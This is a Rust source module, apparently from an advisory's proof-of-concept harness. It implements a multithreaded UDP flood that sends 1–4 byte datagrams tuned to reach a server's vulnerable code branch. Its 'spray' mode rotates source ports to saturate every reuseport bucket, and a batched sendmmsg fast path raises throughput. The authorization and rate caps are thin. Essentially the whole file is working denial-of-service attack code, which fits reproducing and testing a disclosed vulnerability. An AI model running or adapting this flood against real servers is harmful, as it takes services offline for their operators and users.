//! attacker-flood (advisory §8.3, §8.4).
//!
//! Emits 1–4 byte UDP datagrams at a controlled, measured rate. Two modes:
//!   * `single` — one fixed source port, all packets land on ONE reuseport
//!     bucket (per-thread threshold, ~300 pps).
//!   * `spray`  — a pool of distinct source ports round-robined across workers,
//!     spreading packets across ALL buckets (whole-server threshold).

use crate::cli::{AttackArgs, GlobalGuards, SprayMode};
use crate::guard;
#[cfg(not(target_os = "linux"))]
use crate::pacer::RatePacer;
use std::io;
use std::net::{SocketAddr, UdpSocket};
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use std::time::{Duration, Instant};

#[derive(Debug, Clone, Copy)]
pub struct FloodStats {
    pub sent: u64,
    pub achieved_pps: f64,
    pub elapsed: Duration,
}

/// Validate an attack payload length: MUST be in 1..=4 (advisory §8.3).
pub fn validate_payload_len(len: usize) -> Result<(), String> {
    if (1..=4).contains(&len) {
        Ok(())
    } else {
        Err(format!(
            "attack payload_len must be in 1..=4 to hit the vulnerable branch (got {len})"
        ))
    }
}

/// CLI entry point.
pub fn run(args: AttackArgs, guards: &GlobalGuards) -> io::Result<()> {
    validate_payload_len(args.payload_len).map_err(|e| io::Error::new(io::ErrorKind::InvalidInput, e))?;
    guard::authorize(guards, args.pps, args.secs)
        .map_err(|e| io::Error::new(io::ErrorKind::PermissionDenied, e.to_string()))?;

    let stop = Arc::new(AtomicBool::new(false));

    eprintln!(
        "[attack] target={} target_pps={} secs={} payload_len={} mode={:?}",
        args.target, args.pps, args.secs, args.payload_len, args.mode
    );

    let stats = run_flood(&args, guards, stop)?;
    eprintln!(
        "[attack] done: sent={} achieved_pps={:.1} elapsed={:.2}s",
        stats.sent,
        stats.achieved_pps,
        stats.elapsed.as_secs_f64()
    );
    Ok(())
}

/// Run the flood. Honors `stop` (Ctrl-C / harness) for early, clean shutdown.
pub fn run_flood(args: &AttackArgs, guards: &GlobalGuards, stop: Arc<AtomicBool>) -> io::Result<FloodStats> {
    let n_workers = if args.workers == 0 {
        std::thread::available_parallelism().map(|n| n.get()).unwrap_or(4)
    } else {
        args.workers
    };

    let deadline = Instant::now() + Duration::from_secs(args.secs.min(guards.max_secs));
    let sent = Arc::new(AtomicU64::new(0));
    let payload = vec![0u8; args.payload_len];

    // Distribute the source-port pool across workers so their union covers all buckets.
    let pool_size = match args.mode {
        SprayMode::Spray => args.port_pool.max(n_workers),
        SprayMode::Single => n_workers, // one socket per worker, all on the same fixed port intent
    };
    let per_worker_pps = if args.pps == 0 { 0 } else { (args.pps / n_workers as u64).max(1) };

    let start = Instant::now();
    let mut handles = Vec::with_capacity(n_workers);
    for w in 0..n_workers {
        let target = args.target;
        let payload = payload.clone();
        let sent = Arc::clone(&sent);
        let stop = Arc::clone(&stop);
        let mode = args.mode;
        let src_port = args.src_port;
        // Each worker owns ceil(pool_size / n_workers) sockets.
        let sockets_for_worker = worker_socket_count(pool_size, n_workers, w);

        handles.push(std::thread::spawn(move || -> io::Result<()> {
            let sockets = open_sockets(mode, src_port, sockets_for_worker, w)?;
            let local_sent = blast(&sockets, &payload, target, deadline, &stop, per_worker_pps)?;
            sent.fetch_add(local_sent, Ordering::Relaxed);
            Ok(())
        }));
    }

    for h in handles {
        h.join().map_err(|_| io::Error::new(io::ErrorKind::Other, "worker thread panicked"))??;
    }

    let elapsed = start.elapsed();
    let total = sent.load(Ordering::Relaxed);
    Ok(FloodStats {
        sent: total,
        achieved_pps: total as f64 / elapsed.as_secs_f64().max(1e-9),
        elapsed,
    })
}

/// Linux: batched `sendmmsg` fast path with an enlarged send buffer.
#[cfg(target_os = "linux")]
fn blast(
    sockets: &[UdpSocket],
    payload: &[u8],
    target: SocketAddr,
    deadline: Instant,
    stop: &Arc<AtomicBool>,
    per_worker_pps: u64,
) -> io::Result<u64> {
    for s in sockets {
        crate::fastsend::set_sndbuf(s, 8 * 1024 * 1024);
    }
    crate::fastsend::blast(sockets, payload, target, deadline, stop, per_worker_pps)
}

/// Portable fallback: one `send_to` syscall per packet, `Instant`-paced.
#[cfg(not(target_os = "linux"))]
fn blast(
    sockets: &[UdpSocket],
    payload: &[u8],
    target: SocketAddr,
    deadline: Instant,
    stop: &Arc<AtomicBool>,
    per_worker_pps: u64,
) -> io::Result<u64> {
    let mut pacer = RatePacer::new(per_worker_pps);
    let mut idx = 0usize;
    let mut local_sent = 0u64;
    while Instant::now() < deadline && !stop.load(Ordering::Relaxed) {
        pacer.wait_for_next_slot();
        let sock = &sockets[idx % sockets.len()];
        idx = idx.wrapping_add(1);
        match sock.send_to(payload, target) {
            Ok(_) => local_sent += 1,
            // Send queue full (ENOBUFS). Common with `--pps 0` (uncapped) on
            // Windows: the local stack fills before the NIC drains. Back off
            // briefly and retry rather than aborting the run.
            Err(ref e) if is_enobufs(e) => std::thread::sleep(Duration::from_micros(200)),
            Err(ref e) if e.kind() == io::ErrorKind::WouldBlock => {}
            Err(e) if is_transient(&e) => {}
            Err(e) => return Err(e),
        }
    }
    Ok(local_sent)
}

fn worker_socket_count(pool_size: usize, n_workers: usize, w: usize) -> usize {
    let base = pool_size / n_workers;
    let rem = pool_size % n_workers;
    (base + if w < rem { 1 } else { 0 }).max(1)
}

/// Open `count` UDP sockets. In `single` mode bind the fixed source port on the
/// first socket (worker 0) and ephemeral elsewhere; in `spray` mode bind
/// ephemeral so the OS hands out distinct source ports.
fn open_sockets(mode: SprayMode, src_port: u16, count: usize, worker: usize) -> io::Result<Vec<UdpSocket>> {
    let mut v = Vec::with_capacity(count);
    for i in 0..count {
        let bind: SocketAddr = match (mode, worker, i, src_port) {
            (SprayMode::Single, 0, 0, p) if p != 0 => format!("0.0.0.0:{p}").parse().unwrap(),
            _ => "0.0.0.0:0".parse().unwrap(),
        };
        let sock = UdpSocket::bind(bind)?;
        sock.set_nonblocking(false)?;
        v.push(sock);
    }
    Ok(v)
}

/// ENOBUFS: local send buffer / queue is full (WSAENOBUFS=10055 on Windows).
/// Recoverable — the send should be retried after a brief pause. (Linux uses the
/// batched sendmmsg path in fastsend.rs, which handles ENOBUFS itself.)
#[cfg(not(target_os = "linux"))]
fn is_enobufs(e: &io::Error) -> bool {
    matches!(e.raw_os_error(), Some(10055) | Some(105))
}

#[cfg(not(target_os = "linux"))]
fn is_transient(e: &io::Error) -> bool {
    matches!(
        e.kind(),
        io::ErrorKind::WouldBlock | io::ErrorKind::Interrupted | io::ErrorKind::ConnectionRefused
    )
}
